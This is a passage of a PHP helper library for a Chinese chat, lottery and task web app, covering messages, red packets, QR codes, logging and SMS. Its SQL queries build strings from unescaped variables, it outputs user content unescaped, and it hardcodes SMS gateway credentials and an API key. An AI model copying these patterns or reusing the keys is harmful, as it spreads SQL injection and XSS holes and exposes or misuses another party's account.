    return $html;
}

function show_namestatus($uid = "")
{
    global $db, $user_group;
    if ($uid == "") {
        $uid = $_SESSION["userid"];
    }
    $row = $db->exec("select * from " . tname("bank") . " where uid='{$uid}' ");
    if ($row) {
        return "<span style='    font-size: 14px;
    font-weight: lighter;
    color: #fff;
    background: #ff6900;
    border-radius: 5px;
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    padding: 2px 3px;
    margin-left: 3px;'>实</span>";
    }
}

function task_pay($tid)
{
}

function task_close($tid)
{
}

function qr_creat($url, $logo = "", $filename = false)
{
    $path = "../images/qr/" . date("Ym");
    if (!is_dir($path)) {
        mkdir($path);
    }
    if (!$filename) {
        $filename = date("YmdHis") . rand(1000, 9999) . ".png";
    }

    $filename = $path . "/" . $filename;

    if (file_exists($filename)) {
        unlink($filename);
    }
    include_once "../phpqrcode/phpqrcode.php"; //引入PHP QR库文件

    //二维码内容
    $errorCorrectionLevel = "L";
    //容错级别
    $matrixPointSize = 6;
    //生成图片大小
    //生成二维码图片
    if (!$logo) {
        // 纠错级别：L、M、Q、H
        $errorCorrectionLevel = "L";
        // 点的大小：1到10
        $matrixPointSize = 4;
        //创建一个二维码文件

        QRcode::png(
            $url,
            $filename,
            $errorCorrectionLevel,
            $matrixPointSize,
            2
        );

        return $filename;
    } else {
        QRcode::png(
            $url,
            $filename,
            $errorCorrectionLevel,
            $matrixPointSize,
            2
        );

        //准备好的logo图片
        $QR = $filename;
        //已经生成的原始二维码图

        $QR = imagecreatefromstring(file_get_contents($QR));
        $logo = imagecreatefromstring(file_get_contents($logo));
        $QR_width = imagesx($QR);
        //二维码图片宽度
        $QR_height = imagesy($QR);
        //二维码图片高度
        $logo_width = imagesx($logo);
        //logo图片宽度
        $logo_height = imagesy($logo);
        //logo图片高度
        $logo_qr_width = $QR_width / 5;
        $scale = $logo_width / $logo_qr_width;
        $logo_qr_height = $logo_height / $scale;
        $from_width = ($QR_width - $logo_qr_width) / 2;
        //重新组合图片并调整大小
        imagecopyresampled(
            $QR,
            $logo,
            $from_width,
            $from_width,
            0,
            0,
            $logo_qr_width,
            $logo_qr_height,
            $logo_width,
            $logo_height
        );

        //输出图片
        imagepng($QR, $filename);
        return $filename;
    }
}

function get_frz_money($uid)
{
    global $db;

    $row = $db->exec(
        "select sum(money) as sum from " .
            tname("task") .
            " where uid='{$uid}' and status>=0 and status<4"
    );
    if (!$row["sum"]) {
        $row["sum"] = 0;
    }

    return $row["sum"];
}

function get_user_num1($uid)
{
    global $db;

    $row = $db->exec(
        "select count(*) as num from " . tname("user") . " where pid='{$uid}' "
    );

    return $row["num"];
}
function get_user_num2($uid)
{
    global $db;
    $num = get_user_num1($uid);

    $list = $db->fetch_all(
        "select * from " . tname("user") . " where pid='{$uid}' "
    );
    if (count($list) > 0) {
        foreach ($list as $value) {
            $num += get_user_num1($value["id"]);
        }
    }

    return $num;
}

function get_user_task_num1($uid)
{
    global $db;

    $row = $db->exec(
        "select count(*) as num from " . tname("task") . " where uid='{$uid}' "
    );

    return $row["num"];
}

function get_user_task_num2($uid)
{
    global $db;

    $row = $db->exec(
        "select count(*) as num from " .
            tname("task_active") .
            " where uid='{$uid}' "
    );

    return $row["num"];
}

function get_user_task_num3($uid)
{
    global $db;

    $row = $db->exec(
        "select count(*) as num from " .
            tname("task_active") .
            " where uid='{$uid}' and status='1' "
    );

    return $row["num"];
}

function set_playerid($group)
{
    global $db;

    $arr = ["1" => "B", "2" => "P", "3" => "R", "4" => "O"];
    $year = $arr[$group] . date("Y");
    $row = $db->exec(
        "select * from " .
            tname("user") .
            " where playerid like '%{$year}%' order by playerid desc, id desc limit 0,1"
    );

    if ($row["playerid"]) {
        $num = substr($row["playerid"], strlen($row["playerid"]) - 4, 4);
        $num = $num + 1;
        if (strlen($num) == 1) {
            $num = "000" . $num;
        }
        if (strlen($num) == 2) {
            $num = "00" . $num;
        }
        if (strlen($num) == 3) {
            $num = "0" . $num;
        }
        $return = $year . $num;
    } else {
        $return = $year . "0001";
    }

    return $return;
}

function WXZC($number)
{
    $result = 0;
    $num1 = array_unique($number);
    $len = count($num1);
    if ($len == 5) {
        $result = 120;
    } elseif ($len == 4) {
        $result = 60;
    } elseif ($len == 3) {
        $result = 30;
        foreach ($num1 as $v1) {
            $times = 0;
            foreach ($number as $v2) {
                if ($v1 == $v2) {
                    $times++;
                    if ($times == 3) {
                        $result = 20;
                        break;
                    }
                }
            }
        }
    } elseif ($len == 2) {
        $result = 10;
        foreach ($num1 as $v1) {
            $times = 0;
            foreach ($number as $v2) {
                if ($v1 == $v2) {
                    $times++;
                    if ($times == 4) {
                        $result = 5;
                        break;
                    }
                }
            }
        }
    }

    return $result;
}

function SXZC($str)
{
    $arr = explode(",", $str);
    $number = [$arr[1], $arr[2], $arr[3], $arr[4]];

    $result = 0;
    $num1 = array_unique($number);
    $len = count($num1);
    if ($len == 4) {
        $result = 24;
    } elseif ($len == 3) {
        $result = 12;
    } elseif ($len == 2) {
        $result = 6;
        foreach ($num1 as $v1) {
            $times = 0;
            foreach ($number as $v2) {
                if ($v1 == $v2) {
                    $times++;
                    if ($times == 3) {
                        $result = 4;
                        break;
                    }
                }
            }
        }
    }

    return $result;
}

function SXZC1($number)
{
    //    $arr=explode(',',$str);
    //    $number=array($arr[1],$arr[2],$arr[3],$arr[4]);
    //

    $result = 0;
    $num1 = array_unique($number);
    $len = count($num1);
    if ($len == 4) {
        $result = 24;
    } elseif ($len == 3) {
        $result = 12;
    } elseif ($len == 2) {
        $result = 6;
        foreach ($num1 as $v1) {
            $times = 0;
            foreach ($number as $v2) {
                if ($v1 == $v2) {
                    $times++;
                    if ($times == 3) {
                        $result = 4;
                        break;
                    }
                }
            }
        }
    }

    return $result;
}
function nav_cur($php)
{
    if (strpos($_SERVER["REQUEST_URI"], $php) !== false) {
        return "class='cur'";
    } else {
        return "";
    }
}

function clear_lottery()
{
    global $db;
    $system = get_system();
    $lotterytime = $system["lotterytime"];
    $fromtime = time() - $lotterytime * 24 * 3600;
    $list = $db->fetch_all("select * from " . tname("game"));
    foreach ($list as $value) {
        $showkey = $value["showkey"];
        $db->query(
            "delete from " .
                lottery_table($showkey) .
                " where lottime<'{$fromtime}'"
        );
    }
}

function http_sendsms($mobile, $message)
{
    // $ch = curl_init();
    // curl_setopt($ch, CURLOPT_URL, "http://sms-api.luosimao.com/v1/send.json");

    // curl_setopt($ch, CURLOPT_HTTP_VERSION  , CURL_HTTP_VERSION_1_0 );
    // curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
    // curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    // curl_setopt($ch, CURLOPT_HEADER, FALSE);

    // curl_setopt($ch, CURLOPT_HTTPAUTH , CURLAUTH_BASIC);
    // curl_setopt($ch, CURLOPT_USERPWD  , 'api:663f1ffc4b3e09ab9a154c0139147f69');

    // curl_setopt($ch, CURLOPT_POST, TRUE);
    // curl_setopt($ch, CURLOPT_POSTFIELDS, array('mobile' => $mobile,'message' => $message));

    // $res = curl_exec( $ch );
    // curl_close( $ch );
    //$res  = curl_error( $ch );
    // return $res;
    // global  $system;
    $url = "http://utf8.api.smschinese.cn/?Uid=l871676667&Key=2db2accc106f7df2bcf666666&smsMob={$mobile}&smsText={$message}";
    $ch = curl_init();
    // curl_init()需要php_curl.dll扩展
    $timeout = 5;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $file_contents = curl_exec($ch);
    curl_close($ch);
    return $file_contents;
}
function ipCity($userip)
{
    //IP数据库路径，这里用的是QQ IP数据库 20110405 纯真版
    $dat_path = "/www/wwwroot/38.45.127.82/inc/QQWry.Dat";
    //$URLpath="http://".$_SERVER['HTTP_HOST'];
    //$dat_path =$URLpath."/source/plugin/QQWry.dat";
    //判断IP地址是否有效

    if (!ereg("^([0-9]{1,3}.){3}[0-9]{1,3}$", $userip)) {
        return "IP Address Invalid";
    }

    //打开IP数据库
    if (!($fd = @fopen($dat_path, "rb"))) {
        return "IP data file not exists or access denied";
    }

    //explode函数分解IP地址，运算得出整数形结果
    $userip = explode(".", $userip);
    $useripNum =
        $userip[0] * 16777216 +
        $userip[1] * 65536 +
        $userip[2] * 256 +
        $userip[3];

    //获取IP地址索引开始和结束位置
    $DataBegin = fread($fd, 4);
    $DataEnd = fread($fd, 4);
    $useripbegin = implode("", unpack("L", $DataBegin));
    if ($useripbegin < 0) {
        $useripbegin += pow(2, 32);
    }
    $useripend = implode("", unpack("L", $DataEnd));
    if ($useripend < 0) {
        $useripend += pow(2, 32);
    }
    $useripAllNum = ($useripend - $useripbegin) / 7 + 1;

    $BeginNum = 0;
    $EndNum = $useripAllNum;

    //使用二分查找法从索引记录中搜索匹配的IP地址记录
    while ($userip1num > $useripNum || $userip2num < $useripNum) {
        $Middle = intval(($EndNum + $BeginNum) / 2);

        //偏移指针到索引位置读取4个字节
        fseek($fd, $useripbegin + 7 * $Middle);
        $useripData1 = fread($fd, 4);
        if (strlen($useripData1) < 4) {
            fclose($fd);
            return "File Error";
        }
        //提取出来的数据转换成长整形，如果数据是负数则加上2的32次幂
        $userip1num = implode("", unpack("L", $useripData1));
        if ($userip1num < 0) {
            $userip1num += pow(2, 32);
        }

        //提取的长整型数大于我们IP地址则修改结束位置进行下一次循环
        if ($userip1num > $useripNum) {
            $EndNum = $Middle;
            continue;
        }

        //取完上一个索引后取下一个索引
        $DataSeek = fread($fd, 3);
        if (strlen($DataSeek) < 3) {
            fclose($fd);
            return "File Error";
        }
        $DataSeek = implode("", unpack("L", $DataSeek . chr(0)));
        fseek($fd, $DataSeek);
        $useripData2 = fread($fd, 4);
        if (strlen($useripData2) < 4) {
            fclose($fd);
            return "File Error";
        }
        $userip2num = implode("", unpack("L", $useripData2));
        if ($userip2num < 0) {
            $userip2num += pow(2, 32);
        }

        //找不到IP地址对应城市
        if ($userip2num < $useripNum) {
            if ($Middle == $BeginNum) {
                fclose($fd);
                return "No Data";
            }
            $BeginNum = $Middle;
        }
    }

    $useripFlag = fread($fd, 1);
    if ($useripFlag == chr(1)) {
        $useripSeek = fread($fd, 3);
        if (strlen($useripSeek) < 3) {
            fclose($fd);
            return "System Error";
        }
        $useripSeek = implode("", unpack("L", $useripSeek . chr(0)));
        fseek($fd, $useripSeek);
        $useripFlag = fread($fd, 1);
    }

    if ($useripFlag == chr(2)) {
        $AddrSeek = fread($fd, 3);
        if (strlen($AddrSeek) < 3) {
            fclose($fd);
            return "System Error";
        }
        $useripFlag = fread($fd, 1);
        if ($useripFlag == chr(2)) {
            $AddrSeek2 = fread($fd, 3);
            if (strlen($AddrSeek2) < 3) {
                fclose($fd);
                return "System Error";
            }
            $AddrSeek2 = implode("", unpack("L", $AddrSeek2 . chr(0)));
            fseek($fd, $AddrSeek2);
        } else {
            fseek($fd, -1, SEEK_CUR);
        }

        while (($char = fread($fd, 1)) != chr(0)) {
            $useripAddr2 .= $char;
        }

        $AddrSeek = implode("", unpack("L", $AddrSeek . chr(0)));
        fseek($fd, $AddrSeek);

        while (($char = fread($fd, 1)) != chr(0)) {
            $useripAddr1 .= $char;
        }
    } else {
        fseek($fd, -1, SEEK_CUR);
        while (($char = fread($fd, 1)) != chr(0)) {
            $useripAddr1 .= $char;
        }

        $useripFlag = fread($fd, 1);
        if ($useripFlag == chr(2)) {
            $AddrSeek2 = fread($fd, 3);
            if (strlen($AddrSeek2) < 3) {
                fclose($fd);
                return "System Error";
            }
            $AddrSeek2 = implode("", unpack("L", $AddrSeek2 . chr(0)));
            fseek($fd, $AddrSeek2);
        } else {
            fseek($fd, -1, SEEK_CUR);
        }
        while (($char = fread($fd, 1)) != chr(0)) {
            $useripAddr2 .= $char;
        }
    }
    fclose($fd);

    //返回IP地址对应的城市结果
    if (preg_match("/http/i", $useripAddr2)) {
        $useripAddr2 = "";
    }
    $useripaddr = "$useripAddr1 $useripAddr2";
    $useripaddr = preg_replace("/CZ88.Net/is", "", $useripaddr);
    $useripaddr = preg_replace("/^s*/is", "", $useripaddr);
    $useripaddr = preg_replace('/s*$/is', "", $useripaddr);
    if (preg_match("/http/i", $useripaddr) || $useripaddr == "") {
        $useripaddr = "No Data";
    }

    return $useripaddr;
}
function getIP()
{
    if (@$_SERVER["HTTP_X_FORWARDED_FOR"]) {
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } elseif (@$_SERVER["HTTP_CLIENT_IP"]) {
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (@$_SERVER["REMOTE_ADDR"]) {
        $ip = $_SERVER["REMOTE_ADDR"];
    } elseif (@getenv("HTTP_X_FORWARDED_FOR")) {
        $ip = getenv("HTTP_X_FORWARDED_FOR");
    } elseif (@getenv("HTTP_CLIENT_IP")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } elseif (@getenv("REMOTE_ADDR")) {
        $ip = getenv("REMOTE_ADDR");
    } else {
        $ip = "Unknown";
    }
    return $ip;
}
function add_adminlog($content)
{
    global $db, $_SESSION;

    $uid = $_SESSION["adminid"];
    $user = $db->exec("select * from " . tname("admin") . " where id='{$uid}'");

    $ip = getIP();

    $now = time();

    $text_infor = ipCity($ip);
    $address = iconv("GB2312", "UTF-8", $text_infor);
    $sql =
        "insert into " .
        tname("adminlog") .
        "(uid,name,time,ip,content,address) values('{$uid}','{$user["name"]}','{$now}','{$ip}','{$content}','{$address}') ";

    $db->query($sql);

    if (mysql_affected_rows() > 0) {
        return true;
    } else {
        return false;
    }
}
function add_userlog($content, $uid = "", $deviceInfo = "")
{
    global $db, $_SESSION;
    if ($uid == "") {
        $uid = $_SESSION["userid"];
    }
    $user = $db->exec("select * from " . tname("user") . " where id='{$uid}'");

    $ip = getIP();

    $now = time();

    $text_infor = ipCity($ip);
    $address = iconv("GB2312", "UTF-8", $text_infor);

    $deviceInfo = serialize(getdivice());
    $db->query(
        "update " . tname("user") . " set online='{$now}' where id='{$uid}'"
    );
    $db->query(
        "update " .
            tname("user") .
            " set loginaddress='{$address}' where id='{$uid}'"
    );
    $db->query(
        "update " . tname("user") . " set loginip='{$ip}' where id='{$uid}'"
    );
    $db->query(
        "update " . tname("user") . " set logintime='{$now}' where id='{$uid}'"
    );
    $db->query(
        "update " .
            tname("user") .
            " set logintimes=logintimes+1 where id='{$uid}'"
    );

    $sql =
        "insert into " .
        tname("userlog") .
        "(uid,name,time,ip,content,address,deviceInfo) values('{$uid}','{$user["name"]}','{$now}','{$ip}','{$content}','{$address}','{$deviceInfo}') ";

    $db->query($sql);

    if ($db->affected_rows() > 0) {
        return true;
    } else {
        return false;
    }
}
function set_taskstatus($begintime, $endtime)
{
    $now = time();
    if ($now < $begintime) {
        return 0;
    }
    if ($now >= $begintime and $now <= $endtime) {
        return 1;
    }
    if ($now > $endtime) {
        return 2;
    }
}

function cookie_set()
{
    global $db, $_SESSION, $_COOKIE;

    if ($_COOKIE["login_auth"]) {
        $cookie = $_COOKIE["login_auth"];
    } else {
        $cookie = date("Ymdhis", time()) . "-" . rand(1000, 9999);
        setcookie("login_auth", $cookie, time() + 3600 * 24 * 365 * 3, "/");
    }
    if ($_SESSION["userid"] > 0) {
        $type = 1;
        $uid = $_SESSION["userid"];
    } else {
        $type = 0;
        $uid = 0;
    }
    $now = time();
    $ip = getIP();
    $text_infor = ipCity($ip);
    $address = iconv("GB2312", "UTF-8", $text_infor);
    $deviceInfo = serialize(getdivice());
    $row = $db->exec(
        "select * from " . tname("cookie") . " where cookie='{$cookie}'"
    );
    if ($row["id"] > 0) {
        $sql =
            "update " .
            tname("cookie") .
            " set lasttime='{$now}',times=times+1,`type`='{$type}',uid='{$uid}',ip='{$ip}',address='{$address}',device='{$deviceInfo}' where id='{$row["id"]}'";

        $db->query($sql);
    } else {
        $sql =
            "insert into " .
            tname("cookie") .
            "(uid,`type`,cookie,fristtime,lasttime,times,ip,address,device) values('{$uid}','{$type}','{$cookie}','{$now}','{$now}',1,'{$ip}','{$address}','{$deviceInfo}')";
        $db->query($sql);
    }

    if ($uid > 0) {
        $db->query(
            "update " .
                tname("user") .
                " set cookie='{$cookie}' where id='{$uid}'"
        );
        $db->query(
            "update " .
                tname("user") .
                " set loginaddress='{$address}' where id='{$uid}'"
        );
        $db->query(
            "update " . tname("user") . " set loginip='{$ip}' where id='{$uid}'"
        );
        $db->query(
            "update " .
                tname("user") .
                " set logintime='{$now}' where id='{$uid}'"
        );
    }
}

function voice_delete($id)
{
    global $db;
    $voice = $db->exec("select * from " . tname("voice") . " where id='{$id}'");
    $src = unserialize($voice["src"]);
    if (count($src) >= 1) {
        unlink(dirname(__FILE__) . "/../voice/" . $src[0]);
    }
    $db->query("delete from " . tname("voice") . " where id='{$id}'");
}

function task_status($id)
{
    global $db, $task_status;

    $task = $db->exec("select * from " . tname("task") . " where id='{$id}'");

    $status = set_taskstatus($task["begindate"], $task["enddate"]);
    if ($status != $task["status"]) {
        $db->query(
            "update " .
                tname("task") .
                " set `status`='{$status}' where id='{$id}'"
        );
    }
    return $task_status[$task["status"]];
}

function user_search($type, $key, $value)
{
    global $db;

    $list = $db->fetch_all("select * from " . tname("user") . "");
    $str = "";
    if (count($list) > 0) {
        foreach ($list as $key1 => $value1) {
            $temp = unserialize($value1[$type]);
            if ($temp[$key] == $value) {
                if ($str != "") {
                    $str .= ",";
                }
                $str .= $value1["id"];
            }
        }
    }

    return " and id in ({$str}) ";
}

function get_room_num1($hid, $room_name)
{
    global $db;
    $room_list = $db->fetch_all(
        "select * from " . tname("room") . " where hid='{$hid}' "
    );
    $sum = 0;
    if (count($room_list) > 0) {
        foreach ($room_list as $key2 => $value2) {
            $r = unserialize($value2["room"]);

            if (count($r) > 0) {
                foreach ($r as $key3 => $value3) {
                    if ($value3["name"] == $room_name) {
                        $sum += $value3["num"];
                    }
                }
            }
        }
    }

    return $sum;
}

function ArrToJson($arr)
{
    $str = "{";
    foreach ($arr as $k => $v) {
        if ($str != "{") {
            $str .= ",";
        }
        $str .= '"' . $k . '":"' . $v . '"';
    }
    $str .= "}";
    return $str;
}

function msg_content($row, $fromid = "")
{
    global $db, $HttpPath;
    // if($row['type']=='text')return r get_textarea($row['content']);
    if ($fromid == "") {
        $fromid = $_SESSION["userid"];
    }
    $content = json_decode($row["content"], true);
    $type = $row["type"];

    if ($content["type"] == "emotion" or $type == "emotion") {
        $emotion = [
            "微笑",
            "撇嘴",
            "色",
            "发呆",
            "得意",
            "流泪",
            "害羞",
            "闭嘴",
            "睡",
            "大哭",
            "尴尬",
            "发怒",
            "调皮",
            "呲牙",
            "惊讶",
            "难过",
            "酷",
            "冷汗",
            "抓狂",
            "吐",
            "偷笑",
            "可爱",
            "白眼",
            "傲慢",
            "饥饿",
            "困",
            "惊恐",
            "流汗",
            "憨笑",
            "大兵",
            "奋斗",
            "咒骂",
            "疑问",
            "嘘",
            "晕",
            "折磨",
            "衰",
            "骷髅",
            "敲打",
            "再见",
            "擦汗",
            "抠鼻",
            "鼓掌",
            "糗大了",
            "坏笑",
            "左哼哼",
            "右哼哼",
            "哈欠",
            "鄙视",
            "委屈",
            "快哭了",
            "阴险",
            "亲亲",
            "吓",
            "可怜",
            "菜刀",
            "西瓜",
            "啤酒",
            "篮球",
            "乒乓",
            "咖啡",
            "饭",
            "猪头",
            "玫瑰",
            "凋谢",
            "示爱",
            "爱心",
            "心碎",
            "蛋糕",
            "闪电",
            "炸弹",
            "刀",
            "足球",
            "瓢虫",
            "便便",
            "月亮",
            "太阳",
            "礼物",
            "拥抱",
            "强",
            "弱",
            "握手",
            "胜利",
            "抱拳",
            "勾引",
            "拳头",
            "差劲",
            "爱你",
            "NO",
            "OK",
            "爱情",
            "飞吻",
            "跳跳",
            "发抖",
            "怄火",
            "转圈",
            "磕头",
            "回头",
            "跳绳",
            "挥手",
            "激动",
            "闭嘴",
            "笑哭",
            "吐舌",
            "耶",
            "跳舞",
            "恐惧",
            "失望",
            "脸红",
            "无语",
            "奸笑",
            "嘿哈",
            "鬼混",
            "福",
            "合十",
            "强壮",
            "红包",
            "发财",
            "庆祝",
            "礼物",
            "机制",
        ];
        $str = $content["content"];
        foreach ($emotion as $k => $v) {
            $img = $k + 100;
            $img = "<img src='/static/emoji/{$img}.gif' class='face'>";
            if (strpos($str, "[{$v}]") !== false) {
                $str = str_replace("[{$v}]", $img, $str);
            }
        }
        $type = $content["type"];
        $content = $str;
    } elseif ($content["type"] == "remind") {
        if ($row["userid"] == $fromid) {
            $color = "#ff0000";
        } else {
            $color = "#2319dc";
        }

        if ($content["remind"]["id"] == $fromid) {
            $content = str_replace(
                "@{{$content["remind"]["id"]}}",
                "<span style='color: {$color}'>有人@我</span>",
                $content["content"]
            );
        } else {
            $content = str_replace(
                "@{{$content["remind"]["id"]}}",
                "<span style='color:{$color}'>@{$content["remind"]["nickname"]}</span>",
                $content["content"]
            );
        }
    } elseif ($type == "apply") {
        $apply = $db->exec(
            "select * from " .
                tname("group_apply") .
                " where id='{$content["other"]["applyid"]}'"
        );
        $group = GroupInfo($apply["group_id"]);
        $user = userinfo($apply["userid"]);
        $content1 = $user["nickname"] . "申请加入群：" . $group["name"];
        if ($content["other"]["content"]) {
            $content1 .= "<div><span style='color: #666'>附言：</span>{$content["other"]["content"]}</div>";
        }
        $content = $content1;
        //$content=str_replace("@{{$content['remind']['id']}}","@{$content['remind']['nickname']}",$content['content']);
    } else {
        $content = $row["content"];
        $content = str_replace('"', "", $content);
    }
    if ($type == "image") {
        if (strpos($content, "ttp") === false) {
            $content = $HttpPath . $content;
        }
        $content = "<img src='{$content}' class='chatimg' onclick='showimg(this.src);'>";
    } elseif ($type == "voice") {
        $content = explode(",", $content);
        $content = explode(":", $content[0]);
        $src = $content[1] . ":" . $content[2];
        $content = "<audio src=\"{$src}\" controls=\"controls\"></audio>";
    } elseif ($type == "vedio") {
        $content = json_decode($row["content"], true);
        //        $src=$content['src'];
        $src = $content["src"];
        if (strpos($src, "http") === false) {
            $src = $HttpPath . $src;
        }
        $content = "<video src=\"{$src}\" controls style='width: 100%;max-width: 250px'  controls=\"controls\"></video>";
        //  $content=$src;
    } elseif ($type == "redpacket") {
        $content = json_decode($row["content"], true);
        $redpacket = $db->exec(
            "select * from " .
                tname("readpacket") .
                " where id='{$content["id"]}'"
        );
        if ($redpacket["id"] > 0) {
            $content["status"] = $redpacket["status"];
            $views = unserialize($redpacket["views"]);
            if (in_array($fromid, $views)) {
                $content["isopen"] = 1;
            } else {
                $content["isopen"] = "0";
            }
            $content["money"] = 0;
            $userids = unserialize($redpacket["userids"]);
            if (count($userids) > 0) {
                foreach ($userids as $v) {
                    if ($v["userid"] == $fromid) {
                        $content["money"] = $v["money"];
                        break;
                    }
                }
            }
        }
    }

    return $content;
}

function arr_format($arr)
{
    if (count($arr) > 0) {
        foreach ($arr as $key => $value) {
            foreach ($value as $key1 => $value1) {
                if ($key1 > 0 && $key1 < 1000) {
                    unset($value[$key1]);
                }
            }
            $arr[$key] = $value;
        }
        return $arr;
    } else {
        return [];
    }
}

function msg_showcontent1($row, $fromid = "")
{
    global $db;
    $userlist = group_users1($row["groupid"]);
    $userid = $row["userid"];
    $sendname = "";
    if ($fromid == "") {
        $fromid = $_SESSION["userid"];
    }
    if ($userid == $fromid) {
        $sendname = "我";
    } else {
        if (count($userlist) > 0) {
            foreach ($userlist as $value) {
                if ($value["id"] == $userid) {
                    if ($value["nickname"]) {
                        $sendname = $value["nickname"];
                    }
                    break;
                }
            }
        }
        if ($sendname == "") {
            $user = userinfo($userid);
            $sendname = $user["nickname"];
        }
    }
    $content = "";
    if ($row["type"] == "image") {
        $content = "[图片]";
    } elseif ($row["type"] == "voice") {
        $content = "[语音]";
    } elseif ($row["type"] == "vedio") {
        $content = "[视频]";
    } elseif ($row["type"] == "redpacket") {
        $content = "[红包]";
    } elseif ($row["type"] == "apply") {
        $content = json_decode($row["content"], true);
        $apply = $db->exec(
            "select * from " .
                tname("group_apply") .
                " where id='{$content["other"]["applyid"]}'"
        );
        $group = GroupInfo($apply["group_id"]);
        $user = userinfo($apply["userid"]);
        $content1 = $user["nickname"] . "申请加入群：" . $group["name"];
        if ($content["other"]["content"]) {
            $content1 .= "附言：{$content["other"]["content"]}</div>";
        }
        $content = $content1;
    } else {
        $content = msg_content($row, $fromid);
    }

    $res = "";
    if ($sendname) {
        $res = $sendname . "：";
    }
    $res = $res . $content;
    return $res;
}

function toText($str)
{
    $str = str_replace("&nbsp;", " ", $str);
    $str = str_replace("<br>", "", $str);
    return $str;
}
function group_username($group, $userid, $from_uid)
{
    global $db;
    // $group=  GroupInfo($groupid);
    $nicknames = unserialize($group["nicknames"]);
    $user = userinfo($userid);
    $nickname = $user["name"];
    if ($user["nickname"]) {
        $nickname = $user["nickname"];
    }
    //好友备注
    if ($userid > 0) {
        $row = $db->exec(
            "select * from " .
                tname("friend") .
                " where userid='{$from_uid}' and friendid='{$userid}'"
        );
        if ($row["mark"] and $row["mark"] != null) {
            $nickname = $row["mark"];
        }
    }
    //群名片
    if (count($nicknames)) {
        foreach ($nicknames as $key => $value) {
            if ($value["id"] == $userid && $value["name"]) {
                $nickname = $value["name"];
                break;
            }
        }
    }

    return $nickname;
}

function get_usermarkname($userid, $from_uid)
{
    global $db;
    $user = userinfo($userid);
    $nickname = $user["name"];
    if ($user["nickname"]) {
        $nickname = $user["nickname"];
    }
    //好友备注
    if ($userid > 0) {
        $row = $db->exec(
            "select * from " .
                tname("friend") .
                " where userid='{$from_uid}' and friendid='{$userid}'"
        );
        if ($row["mark"] and $row["mark"] != null) {
            $nickname = $row["mark"];
        }
    }
    return $nickname;
}

function chat_msglist(
    $group_id,
    $page = 1,
    $userid = "",
    $search_type = 0,
    $isgroup = 1
) {
    global $db;
    $fromtime = time() - 7 * 24 * 3600;
    if ($isgroup == 1) {
        $group = GroupInfo($group_id);
        $is_owner = $group["is_owner"];
        if ($userid == "") {
            $userid = $_SESSION["userid"];
        }
        $userlist = group_users1($group["id"]);
        $msglist = [];
        $timeshow = $timeshow1 = 0;
        if ($is_owner == 1) {
            $fromtime = 0;
        } else {
            foreach ($userlist as $v) {
                if ($v["id"] == $userid) {
                    if ($v["jointime"] > $fromtime) {
                        $fromtime = $v["jointime"];
                    }
                    break;
                }
            }
        }
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='{$group["id"]}' and isback='0' and addtime>='{$fromtime}' and (tip_uid='' or tip_uid='{$userid}') and del_uids not like '%@{$userid}@%' and content not like '%blob%' order by addtime desc ";
    } else {
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='0' and isback='0' and addtime>='{$fromtime}' and (tip_uid='' or tip_uid='{$userid}')   and ((userid='{$group_id}' and  touid='{$userid}') or (touid='{$group_id}' and userid='{$userid}') )  and del_uids not like '%@{$userid}@%'  and content not like '%blob%' order by addtime desc ";
    }

    if ($search_type == 1) {
        $sql .= " limit 0,50 ";
    } else {
        $from = ($page - 1) * 50;
        $sql .= " limit {$from},50";
    }

    $list = $db->fetch_all($sql);
    if (count($list) > 0) {
        for ($i = count($list) - 1; $i >= 0; $i--) {
            $item = $list[$i];
            if (
                $item["type"] != "tips" &&
                ($item["addtime"] - $timeshow >= 300 ||
                    $item["addtime"] - $timeshow1 >= 900)
            ) {
                $msglist[] = [
                    "type" => "tips",
                    "content" => timestamp($item["addtime"]),
                ];
                $timeshow = $item["addtime"];
            }
            $timeshow1 = $item["addtime"];

            $user = group_userinfo($userlist, $item["userid"]);
            $item["user"] = $user;
            if ($item["userid"] == $userid) {
                $item["self"] = 1;
            } else {
                $item["self"] = 0;
            }
            $item["content1"] = $item["content"];
            $item["content"] = msg_content($item);
            $msglist[] = $item;
        }
    }

    return $msglist;
}

function chat_messages($group_id, $userid = "", $fromtime, $isgroup = 1)
{
    global $db;

    if ($isgroup == 1) {
        $group = GroupInfo($group_id);
        $is_owner = $group["is_owner"];
        if ($userid == "") {
            $userid = $_SESSION["userid"];
        }
        $userlist = group_users1($group["id"]);
        $msglist = [];
        $timeshow = $timeshow1 = 0;
        if ($is_owner == 1) {
        } else {
            foreach ($userlist as $v) {
                if ($v["id"] == $userid) {
                    if ($v["jointime"] > $fromtime) {
                        $fromtime = $v["jointime"];
                    }
                    break;
                }
            }
        }
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='{$group_id}' and isback='0' and addtime>='{$fromtime}' and (tip_uid='' or tip_uid='{$userid}')   and del_uids not like '%@{$userid}@%'  and content not like '%blob%' order by addtime desc ";
    } else {
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='0' and isback='0' and addtime>='{$fromtime}' and (tip_uid='' or tip_uid='{$userid}')   and ((userid='{$group_id}' and touid='{$userid}') or (touid='{$group_id}' and userid='{$userid}') )  and del_uids not like '%@{$userid}@%'  and content not like '%blob%' order by addtime desc ";
    }
    $sql .= " limit 0,50 ";

    $list = $db->fetch_all($sql);
    if (count($list) > 0) {
        for ($i = count($list) - 1; $i >= 0; $i--) {
            $item = $list[$i];
            //            if($item['type']!='tips' && ($item['addtime']-$timeshow>=300 || $item['addtime']-$timeshow1>=900)){
            //                $msglist[]=array('type'=>'tips','content'=>timestamp($item['addtime']));
            //                $timeshow=$item['addtime'];
            //            }
            //            $timeshow1=$item['addtime'];
            if ($isgroup == 1) {
                $user = group_userinfo($userlist, $item["userid"]);
            } else {
                $user = userinfo($item["userid"]);
            }

            $item["user"] = $user;
            if ($item["userid"] == $userid) {
                $item["self"] = 1;
            } else {
                $item["self"] = 0;
            }
            $item["content1"] = $item["content"];
            $item["content"] = msg_content($item);
            $msglist[] = $item;
        }
    }

    return $msglist;
}
